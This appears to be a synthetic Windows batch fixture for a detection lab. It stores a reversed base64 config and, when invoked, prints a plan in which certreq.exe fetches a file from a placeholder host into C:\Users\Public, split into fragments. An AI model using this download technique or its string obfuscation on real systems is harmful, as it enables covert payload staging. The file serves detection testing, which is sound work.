@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|reverse
rem HUNTRESS-MATERIAL:dGFkLjM2NDAzZDJmNDMtZWdhdHNcYmFMc3NlcnRudUhcY2lsYnVQXHNyZXNVXDpDPWh0YXBfZWxpZnx0YWQuYWYxZWM0ZTcvZGlsYXZuaS5lbHBtYXhlLjM2NDAzZDJmNDMvLzpzcHR0aD1scnV8MzY0MDNkMmY0My1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3xlbm9uPWVnYXVnbmFsX3R4ZW58ZWxnbmlzPWhwYXJnfDE9dG51b2NfZWdhdHN8ZXhlLnFlcnRyZWM9cmV0cGFkYXxlbGlmX2V0aXJ3LGV0b21lcl9lcml1cWNhPXNwZXRzfDE9dg==
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set h0=v=1^|steps=acquire_remote,write_file^|adapter=certreq.exe^|stage
set h1=_count=1^|graph=single^|next_language=none^|campaign_id=campaign
set h2=-34f2d30463^|url=https://34f2d30463.example.invalid/7e4ce1fa.d
set h3=at^|file_path=C:\Users\Public\HuntressLab\stage-34f2d30463.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=6f07208a"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY call set "cfg=%%h0%%%%h1%%%%h2%%%%h3%%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo certreq.exe acquire https://34f2d30463.example.invalid/7e4ce1fa.dat to C:\Users\Public\HuntressLab\stage-34f2d30463.dat
exit /b 0
